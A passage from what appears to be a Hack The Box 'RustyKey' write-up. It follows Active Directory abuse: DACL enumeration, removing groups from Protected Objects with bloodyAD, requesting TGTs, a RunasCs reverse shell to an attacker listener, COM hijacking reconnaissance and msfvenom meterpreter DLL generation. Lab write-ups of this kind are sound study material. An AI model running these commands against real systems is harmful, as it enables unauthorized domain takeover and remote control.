DACLREAD    10.10.11.75     389    DC                   Inherited type (GUID)     : inetOrgPerson (4828cc14-1437-45bc-9b07-ad6f015e5f28)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
DACLREAD    10.10.11.75     389    DC               ACE[10] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : User-Account-Restrictions (4c164200-20c0-11d0-a768-00aa006e0529)
DACLREAD    10.10.11.75     389    DC                   Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
DACLREAD    10.10.11.75     389    DC               ACE[11] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : User-Logon (5f202010-79a5-11d0-9020-00c04fc2d4cf)
DACLREAD    10.10.11.75     389    DC                   Inherited type (GUID)     : inetOrgPerson (4828cc14-1437-45bc-9b07-ad6f015e5f28)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
DACLREAD    10.10.11.75     389    DC               ACE[12] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : User-Logon (5f202010-79a5-11d0-9020-00c04fc2d4cf)
DACLREAD    10.10.11.75     389    DC                   Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
DACLREAD    10.10.11.75     389    DC               ACE[13] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : Membership (bc0ac240-79a9-11d0-9020-00c04fc2d4cf)
DACLREAD    10.10.11.75     389    DC                   Inherited type (GUID)     : inetOrgPerson (4828cc14-1437-45bc-9b07-ad6f015e5f28)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
DACLREAD    10.10.11.75     389    DC               ACE[14] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : Membership (bc0ac240-79a9-11d0-9020-00c04fc2d4cf)
DACLREAD    10.10.11.75     389    DC                   Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
DACLREAD    10.10.11.75     389    DC               ACE[15] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : General-Information (59ba2f42-79a2-11d0-9020-00c04fc2d3cf)
DACLREAD    10.10.11.75     389    DC                   Inherited type (GUID)     : inetOrgPerson (4828cc14-1437-45bc-9b07-ad6f015e5f28)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
DACLREAD    10.10.11.75     389    DC               ACE[16] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : General-Information (59ba2f42-79a2-11d0-9020-00c04fc2d3cf)
DACLREAD    10.10.11.75     389    DC                   Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
DACLREAD    10.10.11.75     389    DC               ACE[17] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : RAS-Information (037088f8-0ae1-11d2-b422-00a0c968f939)
DACLREAD    10.10.11.75     389    DC                   Inherited type (GUID)     : inetOrgPerson (4828cc14-1437-45bc-9b07-ad6f015e5f28)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
DACLREAD    10.10.11.75     389    DC               ACE[18] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : RAS-Information (037088f8-0ae1-11d2-b422-00a0c968f939)
DACLREAD    10.10.11.75     389    DC                   Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
DACLREAD    10.10.11.75     389    DC               ACE[19] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperty, WriteProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : ms-DS-Key-Credential-Link (5b47d60f-6090-40b2-9f37-2a4de88f3063)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : Key Admins (S-1-5-21-3316070415-896458127-4139322052-526)
DACLREAD    10.10.11.75     389    DC               ACE[20] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperty, WriteProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : ms-DS-Key-Credential-Link (5b47d60f-6090-40b2-9f37-2a4de88f3063)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : Enterprise Key Admins (S-1-5-21-3316070415-896458127-4139322052-527)
DACLREAD    10.10.11.75     389    DC               ACE[21] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : Self
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : DS-Validated-Write-Computer (9b026da6-0d3c-465c-8bee-5199d7165cba)
DACLREAD    10.10.11.75     389    DC                   Inherited type (GUID)     : Computer (bf967a86-0de6-11d0-a285-00aa003049e2)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : Creator Owner (S-1-3-0)
DACLREAD    10.10.11.75     389    DC               ACE[22] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : Self
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : DS-Validated-Write-Computer (9b026da6-0d3c-465c-8bee-5199d7165cba)
DACLREAD    10.10.11.75     389    DC                   Inherited type (GUID)     : Computer (bf967a86-0de6-11d0-a285-00aa003049e2)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : Principal Self (S-1-5-10)
DACLREAD    10.10.11.75     389    DC               ACE[23] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : Token-Groups (b7c69e6d-2cc7-11d2-854e-00a0c983f608)
DACLREAD    10.10.11.75     389    DC                   Inherited type (GUID)     : Computer (bf967a86-0de6-11d0-a285-00aa003049e2)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : Enterprise Domain Controllers (S-1-5-9)
DACLREAD    10.10.11.75     389    DC               ACE[24] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : Token-Groups (b7c69e6d-2cc7-11d2-854e-00a0c983f608)
DACLREAD    10.10.11.75     389    DC                   Inherited type (GUID)     : Group (bf967a9c-0de6-11d0-a285-00aa003049e2)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : Enterprise Domain Controllers (S-1-5-9)
DACLREAD    10.10.11.75     389    DC               ACE[25] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : Token-Groups (b7c69e6d-2cc7-11d2-854e-00a0c983f608)
DACLREAD    10.10.11.75     389    DC                   Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : Enterprise Domain Controllers (S-1-5-9)
DACLREAD    10.10.11.75     389    DC               ACE[26] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : WriteProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : ms-TPM-Tpm-Information-For-Computer (ea1b7b93-5e48-46d5-bc6c-4df4fda78a35)
DACLREAD    10.10.11.75     389    DC                   Inherited type (GUID)     : Computer (bf967a86-0de6-11d0-a285-00aa003049e2)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : Principal Self (S-1-5-10)
DACLREAD    10.10.11.75     389    DC               ACE[27] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_INHERITED_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Inherited type (GUID)     : inetOrgPerson (4828cc14-1437-45bc-9b07-ad6f015e5f28)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
DACLREAD    10.10.11.75     389    DC               ACE[28] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_INHERITED_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Inherited type (GUID)     : Group (bf967a9c-0de6-11d0-a285-00aa003049e2)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
DACLREAD    10.10.11.75     389    DC               ACE[29] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_INHERITED_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
DACLREAD    10.10.11.75     389    DC               ACE[30] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperty, WriteProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity (3f78c3e5-f79a-46bd-a0b8-9d18116ddc79)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : Principal Self (S-1-5-10)
DACLREAD    10.10.11.75     389    DC               ACE[31] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : ControlAccess, ReadProperty, WriteProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : Private-Information (91e647de-d96f-4b70-9557-d63ff4f3ccd8)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : Principal Self (S-1-5-10)
DACLREAD    10.10.11.75     389    DC               ACE[32] info                
DACLREAD    10.10.11.75     389    DC                   Access mask               : FullControl, Modify, ReadAndExecute, ReadAndWrite, Read, Write, WriteDACL, Delete, ListObject, WriteProperties, Self, CreateChild (0xf01ff)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : Enterprise Admins (S-1-5-21-3316070415-896458127-4139322052-519)
DACLREAD    10.10.11.75     389    DC               ACE[33] info                
DACLREAD    10.10.11.75     389    DC                   Access mask               : ListChildObjects (0x4)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)
DACLREAD    10.10.11.75     389    DC               ACE[34] info                
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadAndExecute, Read, Write, WriteOwner, Delete, ListChildObjects (0xf01bd)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : Administrators (S-1-5-32-544)

```

The `protected Objects` group was of interest since we had `add member` right over it. 

This part was interesting 

```bash
ACE[0] info                
	ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
	ACE flags                 : CONTAINER_INHERIT_ACE
	Access mask               : WriteProperty
	Flags                     : ACE_OBJECT_TYPE_PRESENT
	Object type (GUID)        : Self-Membership (bf9679c0-0de6-11d0-a285-   00aa003049e2)
	Trustee (SID)             : HelpDesk (S-1-5-21-3316070415-896458127-4139322052-1128)

```

According to microsoft learn and other articles this attribut `Self-Membership (bf9679c0-0de6-11d0-a285-00aa003049e2)` gives the user in this case `HelpDesk`  the right to add/remove itself from the group in this case `Protected Objects` But ChatGPT gave me a different explanation.


> *Good catch — the wording **“Self-Membership”** is a bit misleading if you haven’t looked into the AD schema.* *It doesn't mean "modify your own membership"; it means **"modify the membership of this specific group/object"**.*
> 
> *Here’s the nuance:*
> - *The ACE you saw is **WriteProperty** on the attribute with GUID =*  
>     *`bf9679c0-0de6-11d0-a285-00aa003049e2` → that GUID maps to the **`member` attribute**.*
> - *Microsoft’s docs / Impacket / BloodHound often label this GUID as **“Self-Membership”**.*
> 
> *But it does **not** mean “only manage your own account’s membership.”*  
> *It means **the trustee (HelpDesk in your case) has the right to modify the `member` attribute of that object.***
> 
> - *On a **group object**, `member` lists the users/groups inside it.*
> - *On a **container like CN=Protected Objects**, the same attribute is still a membership list.*
> 
> *So in practice:*
> 
> - *If HelpDesk has `WriteProperty:member` on `CN=Protected Objects`, it can **add/remove any user (including itself or others)** from that group/container.*
>     
> - *If the ACE were instead `SELF` + `WriteMembers`, then it would mean “the object can add/remove itself.” But your DACL explicitly says trustee = **HelpDesk SID** with full `WriteProperty` on `member`.*
> 
> *Conclusion:*  
> *This permission means **HelpDesk can manage membership of CN=Protected Objects entirely — not just itself**.*
> 

In other words, take a look at this ACE.

```bash
ACE[0] info                
	ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
	ACE flags                 : CONTAINER_INHERIT_ACE
	Access mask               : WriteProperty
	Flags                     : ACE_OBJECT_TYPE_PRESENT
	Object type (GUID)        : Self-Membership (bf9679c0-0de6-11d0-a285-   00aa003049e2)
	Trustee (SID)             : HelpDesk (S-1-5-21-3316070415-896458127-4139322052-1128)

```

- **`Object type (GUID)`** → This is basically pointing to which **attribute** the ACE applies to. In your case, `bf9679c0-0de6-11d0-a285-00aa003049e2` maps to the **`member` attribute** of the group. Tools like BloodHound label it **“Self-Membership”**, but that’s mostly for human readability — it’s a **label**, not a restriction.
    
- **`Access mask`** → This defines what actions are allowed on that attribute. Here, **`WriteProperty`** means the trustee (HelpDesk) can **modify the `member` list** — i.e., add or remove entries from that group.

So the real “power” comes from the **Access mask**, not the label (**`Object type (GUID)`** ). The label just tells you which property you’re affecting.

Actually this is shown very well in bloodHound :

![[Pasted_image_20250822153931.png]]

The group `helpdesk` can add members to `protected objects` group but we are not shown anything to do with `removing a member` from the group. Netexec does a good job to show us the ACE `WriteProperty` on the `member` attribute with gives us also the ability to remove users from the `protected objects` group which also is a member of the **`Protected User`**

[[Groups#Protected users Group]]

From the description of the `protected user group` we can conclunde the encryption error we were getting `KDC_ERR_ETYPE_NOSUPP` is because the users are in the `Protected Users` group. Am pretty sure if we enable the `gg.anderson` account  we will also have the same error,  `KDC_ERR_ETYPE_NOSUPP`


![[Pasted_image_20250822160350.png]]

Since only `AES` encryption is allowed for users in the `protected user` group, removing the users from this group will enable us to us `RC4` encryption successfully resolving the error.

#### Removing IT group and Support group from Protected Objects Group

This will result to removing the users from the protected users group allowing us to use `rc4` encryption when requesting for `TGT`.

```bash
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/rustykey]
└─$ faketime -f '+8h' \
bloodyAD -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' --host dc.rustykey.htb -k remove groupMember "Protected Objects" "IT" 
[-] IT removed from Protected Objects

┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/rustykey]
└─$ faketime -f '+8h' \
bloodyAD -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' --host dc.rustykey.htb -k remove groupMember "Protected Objects" "Support"
[-] Support removed from Protected Objects

```


Then we proceed to request the `TGTs`

```bash
faketime -f '+8h' \
impacket-getTGT rustykey.htb/ee.reed:Password@123 -dc-ip 10.10.11.75                                        
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ee.reed.ccache

faketime -f '+8h' \
impacket-getTGT rustykey.htb/bb.morgan:Password@123 -dc-ip 10.10.11.75 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in bb.morgan.ccache

```

if you get permission/right related errors repeat the whole process from add the `it-computer3` to `helpdesk` group then changing the user's passwords then removing the `IT `and `Support` groups from `Protected Objects` group and finally requesting the TGTs.

## Privilege Escalation

In the Desktop folder we have a pdf file 

```bash
*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> ls


    Directory: C:\Users\bb.morgan\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/4/2025   9:15 AM           1976 internal.pdf
-a----        8/23/2025   1:01 PM          51712 RunasCs.exe
-ar---        8/22/2025   5:01 AM             34 user.txt


*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> download internal.pdf
                                        
Info: Downloading C:\Users\bb.morgan\Desktop\internal.pdf to internal.pdf
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> 

```

```pdf
Internal Memo

From: bb.morgan@rustykey.htb
To: support-team@rustykey.htb
Subject: Support Group - Archiving Tool Access
Date: Mon, 10 Mar 2025 14:35:18 +0100

Hey team,
As part of the new Support utilities rollout, extended access has been temporarily granted to allow testing and troubleshooting of file archiving features across shared workstations.

This is mainly to help streamline ticket resolution related to extraction/compression issues reported by the Finance and IT teams. Some newer systems handle context menu actions differently, so registry-level adjustments are expected during this phase.

A few notes:
- Please avoid making unrelated changes to system components while this access is active.
- This permission change is logged and will be rolled back once the archiving utility is confirmed stable in all environments.
- Let DevOps know if you encounter access errors or missing shell actions.

Thanks,
BB Morgan
IT Department
```

From the pdf we can say that:
 - A new **support utility (archiving tool)** is being rolled out.
 - **Temporary extended access/permissions** have been granted on shared workstations so the support team can test and troubleshoot file archiving features.
 - Registry-level adjustments are expected... not clear if support have been granted permission to perform registry-level adjustments. 

Honestly am not familiar with registry related attacks. Its going to be a long journey here.. 

First we know the support group has elevated privileges but unfortunately we cannot login using evil-winrm as `ee.reed` who is a member of `support` group and `remote management group` 

But we can use `runasCs.exe` to get a shell from `bb.morgan` who is already logged in using winrm. 

i dont know but i will contnue from this part when I learn about registries .. the point of solving this challenge is to test our skills and also learn right ?? the lets learn .. 


After two days am done with the registry stuff 
[[Windows Registry]]


### Getting shell as ee.reed

Login as bb.morgan using evil-winrm then trasfer `RunasCs.exe`

```powershell
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> upload RunasCs.exe
                                        
Info: Uploading /home/darklight/Documents/ctf/htb/machines/rustykey/RunasCs.exe to C:\Users\bb.morgan\Documents\RunasCs.exe
                                        
Data: 68948 bytes of 68948 bytes copied
                                        
Info: Upload successful!

```

Then make sure you have changed `ee.reed` account password.

```powershell
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> ./RunasCs.exe ee.reed Password@123 cmd.exe -r 10.10.16.57:1337
[*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
[*] Warning: The logon for user 'ee.reed' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-d09807$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 2128 created in background.
```

on our listener i get a connection as ee.reed. 

```bash
rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.57] from (UNKNOWN) [10.10.11.75] 59530
Microsoft Windows [Version 10.0.17763.7434]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
rustykey\ee.reed

C:\Windows\system32>
```

### COM Hijacking 
[[Windows Registry#COM Hijacking]]
First we query the registry to know the current CLSID present


```cmd
C:\Windows\system32>reg query "HKLM\Software\Classes\CLSID"
reg query "HKLM\Software\Classes\CLSID"

HKEY_LOCAL_MACHINE\Software\Classes\CLSID
    CLBVersion    REG_DWORD    0xc

HKEY_LOCAL_MACHINE\Software\Classes\CLSID\CLSID
HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{0000002F-0000-0000-C000-000000000046}
HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{00000300-0000-0000-C000-000000000046}
HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{00000301-A8F2-4877-BA0A-FD2B6645FB94}
HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{00000303-0000-0000-C000-000000000046}
HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{00000304-0000-0000-C000-000000000046}
HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{00000305-0000-0000-C000-000000000046}
HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{00000306-0000-0000-C000-000000000046}
HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{00000308-0000-0000-C000-000000000046}

[SNIP]

```

Am going to work with the first entry in the list 

```powershell
C:\Windows\system32>reg query "HKLM\Software\Classes\CLSID\{0000002F-0000-0000-C000-000000000046}"
reg query "HKLM\Software\Classes\CLSID\{0000002F-0000-0000-C000-000000000046}"

HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{0000002F-0000-0000-C000-000000000046}
    (Default)    REG_SZ    CLSID_RecordInfo

HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{0000002F-0000-0000-C000-000000000046}\InprocServer32
```

let generate our payload 

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.57 LPORT=4444 -f dll -o shell.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
